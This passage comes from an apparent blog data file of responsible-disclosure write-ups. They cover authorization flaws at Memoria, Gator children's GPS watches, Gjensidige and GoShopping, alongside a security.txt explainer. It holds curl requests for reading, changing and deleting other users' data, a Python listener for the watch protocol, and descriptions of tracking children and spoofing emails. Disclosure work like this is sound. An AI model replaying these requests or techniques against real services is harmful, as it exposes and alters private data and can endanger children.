I guessed <span class="code">https://app.minmemoria.no/#/<b>admin</b></span> and was right. While there was some kind of authorization check I got partial access. I could e.g. see all the institutions in the system, and <b>was able to create my own new institution</b>. I did not try to delete any, but I wouldn't be surprised if that was possible..

Many of the URLs had some kind of ID, so I of course tried changing them seeing if I could get hold of other people's data. But the ID wasn't your regular incremental integer, so I had to create another account and see what kind of IDs that got. Now I was logged in with one user in Chrome and one user in Vivaldi. I'm still not sure what the system for the IDs is, but it is a big number that changes quite a bit from one entry to another. It doesn't seem to be a timestamp with milliseconds or seconds, but it doesn't change more than you would be able to guess or brute force other peoples IDs.

In general there seemed to be proper authorization checks when the URL contained one ID - just like the first one mentioned. However, there were quite a few URL of the format <span class="code">https://app.minmemoria.no/#/patients/&lt;some patient ID&gt;/&lt;some entity type&gt;/&lt;some entity ID&gt;</span>, and at least in some cases <b>there was no check if the logged in user was allowed to access that entity ID</b>.

For example <b>I could read other persons' stories</b> using the URL <span class="code">https://app.minmemoria.no/#/patients/&lt;a patient I had access to&gt;/stories/&lt;some other patient's story ID&gt;</span>.

<img style="float:left;width:450px;margin-right:20px;" class="materialboxed responsive-img" title="It was possible to read and change other persons' stories." data-caption="It was possible to read and change other persons' stories." src="/images/memoria01.png">This type of failing authentication check was the same for <span class="code">PUT</span> and <span class="code">DELETE</span> calls. So <b>I was able to change other persons' stories and delete other persons' pictures</b>. (As mentioned, I created several users and patients so I only accessed and altered contents between these accounts.)

The <a href="https://curl.haxx.se/">Curl</a> command copied from Chrome for changing others' messages looked like this:<pre class="prettyprint">
curl 'https://app.minmemoria.no/api/personas/&lt;a patient I had access to&gt;/events/&lt;message ID&gt;' \\
    -X PUT \\
    -H 'Origin: https://app.minmemoria.no' \\
    -H 'Accept-Encoding: gzip, deflate, br' \\
    -H 'x-request-id: &lt;some UUID&gt;' \\
    -H 'Accept-Language: nb-NO,nb;q=0.8,no;q=0.6,nn;q=0.4,en-US;q=0.2,en;q=0.2' \\
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' \\
    -H 'Content-Type: application/json;charset=UTF-8' \\
    -H 'Accept: application/json, text/plain, */*' \\
    -H 'Referer: https://app.minmemoria.no/' \\
    -H 'Cookie: &lt;session cookie++&gt;' \\
    -H 'Connection: keep-alive' \\
    -H 'x-service-version: 1.0' \\
    --data-binary '{"articleBody":"My altered message"}' \\
    --compressed</pre>
The Curl command for deleting others' pictures looked like this:<pre class="prettyprint">
curl 'https://app.minmemoria.no/api/personas/&lt;a patient I had access to&gt;/folders/&lt;folder ID&gt;/assets/&lt;picture ID&gt;' \\
    -X DELETE \\
    -H 'Origin: https://app.minmemoria.no' \\
    -H 'Accept-Encoding: gzip, deflate, br' \\
    -H 'x-request-id: &lt;some UUID&gt;' \\
    -H 'Accept-Language: nb-NO,nb;q=0.8,no;q=0.6,nn;q=0.4,en-US;q=0.2,en;q=0.2' \\
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' \\
    -H 'Accept: application/json, text/plain, */*' \\
    -H 'Referer: https://app.minmemoria.no/' \\
    -H 'Cookie: &lt;session cookie++&gt;' \\
    -H 'Connection: keep-alive' \\
    -H 'x-service-version: 1.0' \\
    --compressed</pre>
I feel pretty sure there was more problems than these, but I had found more than enough to report.

<h4>Security issues</h4>The issues I saw while doing a quick test of the site:
- <b>Any user could create an institution via the admin pages</b>
- <b>Any user could read any patients' stories</b>
- <b>Any user could change any patients' messages</b>
- <b>Any user could delete any patients' pictures</b>

Surely there were other issues here as well. I stopped checking for more when I found these.

<h4>Reception and handling</h4><h5>Day zero</h5>At night, I sent an e-mail to their contact e-mail address.

<h5>Day 1</h5>Just after lunch I received an e-mail thanking for the discovery and telling that they've reported it to the developers.

<b>I never received any more replies, so I don't know when they fixed it.</b>

<h5>Day 49</h5>I sent a new e-mail asking what the status was.

<h5>Day 50</h5>I got an answer telling that they had fixed the issues.

<h4>Conclusion</h4>Privacy of any social media platform is so important. It's so easy to create web sites today, but it's still hard to make them properly secure.

However, in this case there seems to be a big lack of understanding how to - and/or desire to - secure web apps. Memoria doesn't appear very concerned about security when they had issues like these. I wish they would show more respect for the care service users and their families. I hope they'll use some third party for security audits in the future.
`,
                "images": ["/images/memoria01.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "Data alteration",
                        "url": "/data-alteration"
                    },
                    {
                        "title": "Authorization",
                        "url": "/authorization"
                    },
                    {
                        "title": "OWASP 2013 A7",
                        "url": "/owasp-2013-a7"
                    }
                ]
            },
            {
                "title": "Case #11: Tracking tens of thousands of kids worldwide",
                "published": true,
                "publishDate": "2017-10-18T12:55:00.000Z",
                "updateDate": "2017-10-19T11:11:00.000Z",
                "summary": "Tens of thousands - possibly several hundred thousands - of kids can be tracked via their Gator and Caref watches.",
                "niceUrl": "/2017/10/tracking-kids",
                "text": `<h4>tl;dr</h4><i>Gator Watch</i> - a GPS watch for kids - is leaking data in all ends and anyone on the Internet can live track your kid. We're not talking about a security vulnerability, we're talking about non-existing security.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><a href="http://gatorwatch.com/">Gator Watch</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="red-text">Critical</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>August 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="red-text">Poor</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="red-text">Not fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>A thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Anyone can track any watch, listen to voice messages, fake location, etc. etc.</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div><h4>Background</h4><img style="float:left;width:400px;margin-right:20px;" class="materialboxed responsive-img" title="gatorwatch.com claimed to have sold 300,000 watches before releasing their more secure Gator 3." data-caption="gatorwatch.com claimed to have sold 300,000 watches before releasing their more secure Gator 3." src="/images/gator01.png"/>I bought a Gator 2 smartwatch for my kid after reading some reviews about different watches. The concept was pretty good, but how good was the security?

<b>The company behind Gator Watch claims to have sold more than 300,000 watches. As far as I can understand they are all trackable for anyone on the Internet.</b>

I reported the issue in the start of August and was giving the vendor 90 days to fix the issues, so I was planning to publish this post in the start of November, but suddenly this case was all over the news.

The Gator watch is some places branded as Caref GPS Phone Watch. I'm not entirely sure if this is the same as the Gator 1 watch or if it's also Gator 2.

<h4>Approach (technical stuff)</h4>Looking back at this issue I really started in the wrong end. The biggest issues was so easy to spot without being very technical.

<h5>Watch to server communication</h5>Playing with the watch and the config I saw that <a href="http://gatorwatch.com/support/">it's possible to set up which server the watch connects to.</a>.

First I tried connecting to the Gator Watch server via <span class="code">telnet</span> trying to send HTTP commands. That failed, and I tried a couple of other commands, but the remote server just closed the connection on me.

Then I set it up to my own router's IP address, added a port forwarding to my machine where I was running a very simple Python script printing whatever came my way. <b>I configured the watch to use my IP, and surely it started sending simple strings with stuff like IMEI, positions, battery level, etc. It kept the connection open. The connection was not encrypted and there was no type of session ID or token or anything. It always used the IMEI as the identifier. This was pretty shocking.</b>

The quick-and-dirty Python script I hacked together to listen to the watch:
<pre class="prettyprint lang-python">#!/usr/bin/env python
import socket

TCP_IP = '0.0.0.0'
TCP_PORT = 17015
BUFFER_SIZE = 20

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((TCP_IP, TCP_PORT))
s.listen(1)

conn = None
try:
    conn, addr = s.accept()
    print 'Connection address:', addr
    while 1:
        data = conn.recv(BUFFER_SIZE)
        if not data: break
        print "received data:", data
        #conn.send(data)  # echo
except KeyboardInterrupt:
    print '\\nBye bye :)'
finally:
    if conn is not None:
        conn.close()
    if s is not None:
        s.close()</pre>
I sent some of the commands I got to the Gator Watch server via <span class="code">telnet</span>, and now it kept the connection open. <b>This way one can easily spoof the position of anyone as long as you have the IMEI.</b>

Here's some of the data received from our watch to my fake server (I've randomized the data and removed some newlines):
<pre class="prettyprint lang-python">received data: (45353IMEIHERE416P02,GT03.V10.20170303,7,23201)

received data: (45353IMEIHERE416P02,G,160805A6027.0330N00512.3931E000.41058310.00,6)

received data: (45353IMEIHERE416P02,G,160805A6027.0352N00512.3879E001.411000074.23,6)

received data: (45353IMEIHERE416P02,0,1,160805,220200,5)

received data: (45353IMEIHERE416P02,0,1,160805,220200,5)</pre>
<b>The data contains the software version, IMEI, time, location method (GPS vs Wi-Fi), location coordinates, battery left.</b>

<b>Sending the data to thet server you can get back who is allowed to call the watch. Like <span class="code">#555-2368#Dad</span>. So that makes it pretty easy to identify the family of the child.</b>

<h5>HTTP proxy</h5><img style="float:left;width:400px;margin-right:20px;" class="materialboxed responsive-img" title="Using Charles to intercept the communication between Gator Android app and server." data-caption="Using Charles to intercept the communication between Gator Android app and server." src="/images/gator02.png"/><a href="/2017/08/get-your-ssn-here">Just as in my first case</a> I set up Charles as HTTP+HTTPS proxy to listen to the communication between the Gator Watch server and Gator Watch app. <b>I was shocked to see that there is no encryption between the server and the app.</b>

What's more is that the app and server used an incremental integer as ID for the watch. <b>I could - and still can - just change the ID and get the posisition of any other watch. And it didn't stop there. I could - and still can - easily download the voice messages left by any child or their parent.</b> I changed the ID and got the position of a kid in Sweden. I only downloaded one other voice message, and it was appearantly from a Swedish parent sending some sort of first test message to his kid.

<h5>Decompiling the app</h5>I downloaded the APK for the <a href="https://play.google.com/store/apps/details?id=com.gatorgroup.carefwatch">Android app</a> and decompiled it. It was an hybrid <a href="https://angularjs.org/">Angular</a> app. Again, there was no signs of the app using https for anything. <b>The JavaScript source code gave away addresses to other servers and I found a URL with a what looks like an admin interface.</b>

<h5>Android system log</h5>Being an Android developer I work most days with the phone's system log on the screen. What I didn't see until after I found out of everything, is that <b>the Gator app actually constantly logs the URL which you can just open in your browser and change the integer ID in and get the position of any child wearing the watch</b>.

<img class="materialboxed responsive-img" title="The Gator app constantly prints out one of the vulernable URLs to the Android system log." data-caption="The Gator app constantly prints out one of the vulernable URLs to the Android system log." src="/images/gator04.png"/>
<h4>Security issues</h4><img style="float:right;width:400px;margin-right:20px;" class="materialboxed responsive-img" title="I got the location and voice messages of a random watch in Sweden. (Screenshot from gps-coordinates.net.)" data-caption="I got the location and voice messages of a random watch in Sweden. (Screenshot from gps-coordinates.net.)" src="/images/gator03.png"/>The issues I saw were these:
- <b>Anyone can easily track all Gator watches using a web browser</b>
- <b>Anyone can download any voice message left by child or grown-up</b>
- <b>Anyone can spoof the location of a watch</b>
- <b>Anyone can get hold of phone numbers and names that is allowed to call a watch</b>
- <b>There is no encryption between the app and the server</b>
- <b>There is no encryption between the watch and the server</b>

<h4>Reception and handling</h4><h5>Day zero</h5>Saturday evening I sent an e-mail to customer support of Gator Norway explaining the issues.

<h5>Day 3</h5>Tuesday morning I got a reply thanking me for sending them the information. They would check this out as soon as possible. And <i>"We want our watch to be safe for both children and parents!"</i>

<h5>Day 16</h5>Without my knowledge <a href="https://www.forbrukerradet.no/">The Norwegian Consumer Council</a> and security company <a href="https://www.mnemonic.no">mnemonic</a> started their own testing of different smartwatch brands sold in Norway - among them the Gator 2 watch.

<h5>Day 18</h5>I asked for a status on the issue.

<h5>Day 39</h5><b>They used 3 weeks to get back to me, and told that it "would take some time" to fix this.</b> I can understand that adding security on a completely broken system isn't done very easily. They also said that the Gator 3 Watch and Gator 3 app is already secured.

<h5>Day 76</h5><a href="https://www.forbrukerradet.no/siste-nytt/elendig-sikkerhet-i-smartklokker-for-barn">The Norwegian Consumer Council suddenly broke the news about security issues in smartwatches for children</a> (Norwegian article) - among them Gator Watch. <a href="http://www.bbc.com/news/technology-41652742">BBC also brought the news.</a> (English article) <b>This is when I decided to write this post with the technical details and all.</b> There was no reason to wait the normal 90 days when this is out. It's important that as many people as possible is told about this.

<h4>Conclusion</h4><b>If you ask me this is as bad as it can get. As a parent you want your kid to be nothing but safe. And when you buy a product like this you expect to make them more safe. But what happens is that you put your child at risk. Any predator can track your kid, and even start see patterns in when a child usually goes to e.g. school or after-school activities. It would even be possible to fake the position of the child, tricking parents to believe everything is fine or that their child is somewhere else than they are looking for him/her.

As a developer I just cannot understand how a product like this can end up on the market. Any developer involved in the project on any level would know that this is a really bad product. It's not like anyone mistakenly has screwed up. No one has cared to add any layer of security.

If your child is using Gator Watch I would recommend you stop him or her from doing that. Now.</b>

For those of you wanting to go even deeper I would recommend the solid <a href="https://fil.forbrukerradet.no/wp-content/uploads/2017/10/watchout-rapport-october-2017.pdf">report by Norwegian Consumer Council and mnemonic</a> (PDF, English, 49 pages). They also cover some other brands, go into more privacy issues and show how they did the technical tests.
`,
                "images": ["/images/gator01.png", "/images/gator02.png", "/images/gator03.png", "/images/gator04.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    }
                ]
            },
            {
                "title": "Case #12: Insurance company leaking personal data",
                "published": true,
                "publishDate": "2017-10-23T08:50:00.000Z",
                "summary": "One of the biggest insurance companies in Norway leaked personal data and used 4.5 months to fix the issue.",
                "niceUrl": "/2017/10/gjensidige-leak",
                "text": `<h4>tl;dr</h4><i>Gjensidige Forsikring</i> - one of Norway's biggest insurance companies - was leaking information about customers' cancelled insurances to other customers. First they used 3.5 months to falsely conclude there was no issue, and then one additional month to fix it. Also, their web site can be abused for sending e-mails.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><a href="https://gjensidige.no/group/about-us">Gjensidige Forsikring</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="orange-text">Medium</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>May 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="red-text">Poor</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="orange-text">Partially fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>375 USD worth of gift certificates</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Personal data leak + possibility to spoof e-mails</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div><h4>Background</h4>I have had some insurances with Gjensidige for quite some time. Luckily I haven't had much use for them, but from the little contact I have had I must say I'm a happy customer.

As my insurance company I'm logged in at their site from time to time. Back in May I also took a quick peek at their web site in regards of data security.

<h4>Approach (technical stuff)</h4>When I was logged in I opened <a href="https://help.vivaldi.com/article/developer-tools/">Vivaldi developer tools</a> to inspect the pages and network traffic. There were quite a few <a href="https://en.wikipedia.org/wiki/Ajax_(programming)">Ajax</a> calls in the different pages asking for data to display.

<h5>The missing authorization check</h5><img style="float:left;width:400px;margin-right:20px;" class="materialboxed responsive-img" title="Some of the data returned for a cancelled insurance." data-caption="Some of the data returned for a cancelled insurance." src="/images/gjensidige01.png"/>As should be,for most calls the browser didn't specify any customer ID or anything like that. Those calls were safe. They do, however, have some calls that include some sort of ID, which is specified on the client side. Most of them seemed to do a proper authorization check, but as shown in the cases presented on this blog, there sometimes are exceptions to this.

<b>The REST endpoint giving back a list of cancelled insurances did not check if the ID sent in by the client. This ID seems to be an auto increment integer and I could just step one number to get another customer's cancelled insurances.</b>

The Curl command copied from the browser looked like this: <pre class="prettyprint">curl 'https://www.gjensidige.no/ip-web/forsikringer/annullerte/&lt;customer ID&gt;' \\
    -H 'x-klient-lokasjon: Meldingsboks' \\
    -H 'Applikasjon: INTERNETT' \\
    -H 'Accept-Language: nb-NO,nb;q=0.8,no;q=0.6,nn;q=0.4,en-US;q=0.2,en;q=0.2' \\
    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.97 Safari/537.36 Vivaldi/1.9.818.49' \\
    -H 'Accept: application/json' \\
    -H 'Referer: https://www.gjensidige.no/no/1/Din+side/forsikring/administrer-forsikringer/forsikringsdokumenter-new' \\
    -H 'Accept-Encoding: gzip, deflate, sdch, br' \\
    -H 'Cookie: JSESSIONID=&lt;session cookie&gt;; &lt;a bunch of more cookies&gt;;' \\
    -H 'Connection: keep-alive' --compressed \\
    | python -m json.tool</pre>
I added <span class="code">| python -m json.tool</span> just to get a "pretty print" of the JSON returned to the command line.

<h5>Faking e-mails</h5>I reported the authorization issue using an online form on their site. <b>When I submitted I noticed that the POST request in fact included the name and e-mail address from the sender, and also the e-mail address to whom it should be sent to.</b>

This, of course, got my attention. I saw that you could craft your own e-mails, choosing your own contents, topic, sender and receiver. I copied the <a href="https://curl.haxx.se/">Curl</a> command from the browser and easily changed it to send a "fake" e-mail.

<a href="https://en.wikipedia.org/wiki/Email_spoofing">E-mail spoofing</a> is nothing new, but there are a few interesting points here. There should be no reason why you would need the send and receiver addresses sent from the client. That's what makes it possible to forge e-mails in this case. Gjensidige uses <a href="https://en.wikipedia.org/wiki/Sender_Policy_Framework">Sender Policy Framework</a> (SPF) for their domain, but that wouldn't help in this case as the server sending the e-mails should be whitelisted. However, the server used in this case is not whitelisted, and Gjensidige has the rule <span class="code">~all</span> set. That rule allows for any servers to send e-mails (with <span class="code">SOFTFAIL</span>) from this domain. So, this again means that you don't really need Gjensidige's server to send spoofed e-mails from Gjensidige. So, maybe this is a feature and not a bug? I hope that they don't think this is all right.

Having this issue opens up for nice opportunities for <a href="https://en.wikipedia.org/wiki/Phishing">phishing</a>, or just abuse their server to send spam.

<img class="materialboxed responsive-img" title="The form that can be abused for spoofing e-mails." data-caption="The form that can be abused for spoofing e-mails." src="/images/gjensidige02.png"/>

<h4>Security issues</h4>The information leaked that I saw for cancelled insurances was this:
- Customer ID
- Insurance type
- Insurance number
- Price
- Start date
- Cancellation date
- Reason for cancellation:
  - Missing payments
  - Missing self-declaration
  - Need ceased
  - Insurance converted to other type
- Depending on insurance type there some extra information:
  - Full name and year of birth of customer
  - Full name and year of birth of child
  - Street address
  - Car type and plate number
  - Labour union membership

<b>Some customers, if not most, have several types of insurances which would open for combining information about them.</b> Now, I always minimize the amount of data I access to ensure no one can question my intentions, so I have to <b>make an educated guess that there might even be other types of information on some customers</b>.

Further more - and this is not fixed, so I'm not sure if they consider it a security issue - <b>it's possible to use their own server to send fake e-mails from their own e-mail addresses</b>.

<h4>Reception and handling</h4><h5>Day zero</h5>It wasn't very easy to find the correct contact point, but the closest I got was a general contact form originally to be used for <a href="https://en.wikipedia.org/wiki/Whistleblower">whistle-blowers</a>. I submitted the form Friday night.

It was when submitting this form the first time that I noticed that - as described in more details in the "Approach" part - it was actually possible to use this form as a way to send e-mails from anyone to anyone through their site. So I submitted the form one more time telling them about that as well.

<h5>Day 3</h5>Early Monday morning I got a confirmation that they had received information about the two issues and would inform the right persons. They also asked for me for a phone number where I could be reached.

I wrote back and told them my phone number. I don't think they ever tried to call me.

<h5>Day 80</h5><b>Having not heard anything back and not seeing any fixes I asked them for a status.</b>

<h5>Day 83</h5>In the morning I got a reply telling me that they had "taken care of it" and named another guy who would contact me when he would be back from vacation.

At night I got copied in on an e-mail from that guy where he asked a third guy about giving me feedback.

A couple of minutes later the second guy told me that he knew they had taken this seriously and worked on the issue. I would be contacted by a third guy when he was back from vacation.

<h5>Day 111</h5>I got a response from the Director of Group Security. He thanked me and quoted a security technician saying that the service in question would return an empty list if the logged in user wasn't authorized to get the list from the customer id it used for the request. The director also said that the reason it had taken me so long to get a reply was that they had gone thoroughly through all aspects of this issue.

<b>Gjensidige used more than 3.5 months to "thoroughly" go through "all aspects" of the issue and falsely concluded that the issue was not an issue.</b>

I wrote back and asked if I had misunderstood something and gave concrete examples of customer ids that actually would give data back.

<h5>Day 112</h5>I got a reply back telling me that they had forwarded this information to the person responsibly for the security of gjensidige.no.

<h5>Day 125</h5>I got more feedback telling me that they had confirmed that there was an issue and re-opened the case.

<h5>Day 148</h5>I got a new e-mail telling me that they had fixed and closed the issue in production 9 days earlier.

<h5>Day 163</h5>Writing this post I was surprised to see that the issue with e-mail spoofing remained. I had assumed they closed it earlier on. I sent a new e-mail asking about this.

<h5>Day 164</h5>I got a reply telling that the second report with the e-mail spoofing was stopped before it reached Group Security and the IT department.

<b>It actually Gjensidige 4.5 months to fix an information leak of this severity.</b>

<h4>Conclusion</h4>Gjensidige has been very polite and nice in their communication, and also grateful for getting the reports. <b>I would have said their reception and handling was great, had it not been for my own and other customers' data were accessible for all of 4.5 months after the initial report.</b>

While I understand that not everybody has the flexible server environments like <a href="/2017/08/digipost-leak">Digipost</a> or <a href="/2017/09/skandiabanken-leak">Skandiabanken</a>, even <b>using 4 weeks from the second report before fixing it in production isn't very impressive. This is an insurance company. They need to ensure that their customers' data is safe with them.</b>


`,
                "images": ["/images/gjensidige01.png", "/images/gjensidige02.png"],
                "links": [
                    {
                        "title": "Background: Purpose of these posts",
                        "url": "/2017/08/security-vulnerability-disclosures"
                    }
                ],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "Security Monday",
                        "url": "/security-monday"
                    },
                    {
                        "title": "Information leak",
                        "url": "/information-leak"
                    },
                    {
                        "title": "Authorization",
                        "url": "/authorization"
                    },
                    {
                        "title": "E-mail spoofing",
                        "url": "/email-spoofing"
                    },
                    {
                        "title": "OWASP 2013 A7",
                        "url": "/owasp-2013-a7"
                    }
                ]
            },
            {
                "title": "Add security.txt to your site",
                "published": true,
                "publishDate": "2017-11-04T14:35:00.000Z",
                "updateDate": "2017-11-05T19:15:00.000Z",
                "summary": "Sometimes it's really difficult and time consuming to find a way to report a security vulnerability. But there is a very simple solution for that.",
                "niceUrl": "/2017/11/security-txt",
                "text": `<h4>tl;dr</h4><a href="https://twitter.com/edoverflow">Ed Foudil</a> has proposed <span class="code">security.txt</span> as a standard method for making it easier to report security issues. It's a plain text file with contact info that should be located in the <span class="code">.well-known</span> directory of a web site (or root of a file system). Currently it's a "Internet draft" that has been submitted for <a href="https://en.wikipedia.org/wiki/Request_for_Comments">RFC</a> review.
                
<h4>Why we need security.txt</h4>Over the last three months I have <a href="/category/security">published 12 fresh security issues</a> on my blog. While finding the issues has typically only taken a few minutes, finding somewhere to report the issue sometimes have be a real pain and very time consuming.

In most cases I have had to contact first-line customer support and try to write in a way that will ensure that they understand that they need to report this to the right party. Often this can work ok, but <b>I have even experienced to be turned down by the customer support because they have not understood what I was trying to tell them.</b>

<h5>IKEA</h5>In <a href="/2017/10/ikea-name-leak">the case with IKEA</a> I spent so much time trying to find the correct contact point. They had no general e-mail addresses or anything anywhere. <b>I ended up e-mailing three press contacts with the issues, and it took three weeks before I got their attention and got to tell them what the issue actually was. And according to IKEA this is actually the way any security issue should be reported.</b> <span class="code">security.txt</span> would have been a much better solution.

<h5>Gjensidige</h5>In <a href="/2017/10/gjensidige-leak">the case with the insurance company Gjensidige</a> <b>they managed to lose one of two reports before it reached the IT department</b>. <span class="code">security.txt</span> would have solved this nicely.

<h5>Tryg and Infotorg</h5>In <a href="/2017/08/get-your-ssn-here">the case with 1 million+ Norwegian Social Security numbers etc. exposed</a>, <b>the insurance company Tryg did not read the e-mails sent to the specified contact e-mail address, and Infotorg - who was responsible for the delievering the data - just stopped responding.</b> It was probably a lost case for Infotorg, but at least Tryg would have been notified with a <span class="code">security.txt</span>.

<h5>Project site with SQL injection</h5>In <a href="/2017/10/10-years-of-injection">the case with the company vulnerable for for SQL injection for 10 years</a> I did not know if their customer support form worked at all as I never got a reply. Writing to an e-mail address specified in <span class="code">security.txt</span> would've helped here.

<h5>In general</h5>In most cases the info would have been delivered directly to the correct persons instead of being delayed in some kind of first-line of customer support. You want it to make it easy to report a security issue, and you want the report to get to the right destination asap.

<h4>How to write security.txt</h4>It's a really simple standard. And simple is indeed beautiful. <span class="code">security.txt</span> should be a plain text file located in the <span class="code">.well-known</span> directory of the site, just like <a href="https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml">a bunch of others</a> as per <a href="https://tools.ietf.org/html/rfc5785">RFC 5785</a>.

<h5>Contact directive</h5>The only directive that must be present in <span class="code">security.txt</span> is <span class="code">Contact</span>, which lets you specify either an e-mail address (maybe not very smart considering spam) or a phone number or a URI that provides contact info. The order defines the preferred method of contact.

For my own <a class="code" href="/.well-known/security.txt">security.txt</a> I have used Google's <a href="https://www.google.com/recaptcha/admin#mailhide">reCAPTCHA Mailhide</a> and a link to <a href="https://twitter.com/roysolberg">my own Twitter account</a>.

<h5>Signature directive</h5>In order to ensure the authenticty of the <span class="code">security.txt</span> one should use the <span class="code">Signature</span> directive to sign it using either an external or internal signature.

<h5>Encryption directive</h5>The <span class="code">Encryption</span> lets you add your key for encrypted communication, like your <a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">PGP</a> key or similar.

<h5>Acknowledgement directive</h5>The <span class="code">Acknowledgement</span> allows you to link to a page where security researchers are recognized for their reports.

<h5>It's a proposal</h5>It's a proposal, so be sure to check out <a href="https://securitytxt.org">securitytxt.org</a> for the latest update of the specification. Also, at the time of writing, you should take a look at <a href="https://github.com/securitytxt/security-txt/tree/draft">the draft branch at https://github.com/securitytxt/</a> for the latest development. There's also some interesting discussions on the <a href="https://github.com/securitytxt/security-txt/issues?q=">issue tracker of the same project</a>.

<h4>Example security.txt</h4><pre class="prettyprint">Contact: https://example.com/security-contact-form/
Contact: https://example.com/mailhide/security
Contact: 555-2368

Signature: https://example.com/.well-known/security.txt.sig
Encryption: https://example.com/pgp-key.txt
Acknowledgement: https://example.com/security-hall-of-fame.html</pre>
<h4>Conclusion</h4>This is one is easy. Please add support for <span class="code">security.txt</span> - as soon as you can - to make the web a safer and more secure place for us all.
`,
                "images": ["/images/security.png"],
                "links": [],
                "category":
                {
                    "title": "Security",
                    "url": "/security"
                },
                "tags": [
                    {
                        "title": "security.txt",
                        "url": "/security-txt"
                    }
                ]
            },
            {
                "title": "Case #13: Leaking shopping data",
                "published": true,
                "publishDate": "2017-11-13T19:40:00.000Z",
                "niceUrl": "/2017/11/goshopping-leak",
                "summary": "No one can see what you are shopping online, right?",
                "text": `<h4>tl;dr</h4><i>GoShopping</i> - a company owning several online stores - let anyone see all your previous orders and order lines using just your e-mail address.
                
<h4>Summary</h4><table class="summary">
<tr>
    <td style="width:30%">Who:</td>
    <td><a href="https://goshopping.no/">GoShopping</a></td>
</tr>
<tr>
    <td style="width:30%">Severity level:</td>
    <td><span class="green-text">Low</span> to <span class="orange-text">medium</span></td>
</tr>
<tr>
    <td style="width:30%">Reported:</td>
    <td>July 2017</td>
</tr>
<tr>
    <td style="width:30%">Reception and handling:</td>
    <td><span class="red-text">Poor</span></td>
</tr>
<tr>
    <td style="width:30%">Status:</td>
    <td><span class="green-text">Fixed</span></td>
</tr>
<tr>
    <td style="width:30%">Reward:</td>
    <td>A thank you</td>
</tr>
<tr>
    <td style="width:30%">Issue:</td>
    <td>Leak with all order details</td>
</tr>
</table>
<div style="padding-top:80px;" class="col s12 m5 l5 xl4 right"><div class="card-panel light-blue darken-1"><span style="text-decoration:underline;" class="white-text"><a class="white-text" href="/2017/08/security-vulnerability-disclosures">Background: The purpose of these posts</a></span></div></div><h4>Background</h4>I recently returned to <a href="https://www.kitchenone.no/">KitchenOne</a> to buy some accessories to my coffee machine. I didn't have any account (I don't think you can have), but was a bit relieved and surprised when I during checkout could just enter my e-mail address and it would fill out my name, address and phone number.

That made me think. <b>Is it OK that anyone can enter my e-mail address to a service and get back my full name, address and phone number? And maybe there could be more than meets the eye?</b>

<h4>Approach (technical stuff)</h4><img style="float:left;width:400px;margin-right:20px;" class="materialboxed responsive-img" title="The service was leaking all data about my previous order - including order lines and payment information." data-caption="The service was leaking all data about my previous order - including order lines and payment information." src="/images/goshopping01.png"/>When I was at the checkout step I opened <a href="https://help.vivaldi.com/article/developer-tools/">Vivaldi developer tools</a> to inspect the network traffic. There was a <a href="https://en.wikipedia.org/wiki/Ajax_(programming)">Ajax</a> call to the mother site GoShopping's CMS (they're using <a href="https://umbraco.com/">the open source ASP.NET CMS Umbraco</a>) returning some JSON with the name, address and phone number. <b>But the JSON contained more. It contained my previous order in full details including all items that I bought. And even my payment information was included.</b>

<br style="clear:left;"/>
<h4>Security issues</h4><img style="float:right;width:400px;margin-right:20px;" class="materialboxed responsive-img" title="The service was leaking all data about my previous order - including order lines and payment information." data-caption="The service was leaking all data about my previous order - including order lines and payment information." src="/images/goshopping02.png"/>The service for looking up the address from the e-mail address leaked the following information:
 - Seemingly all orders
 - For an order there was this information:
   - The date of the purchase
   - <b>Each and all products ordered</b>
   - Any discount
   - <b>Name and address used for payment</b> (in addition to the one used for delievery)
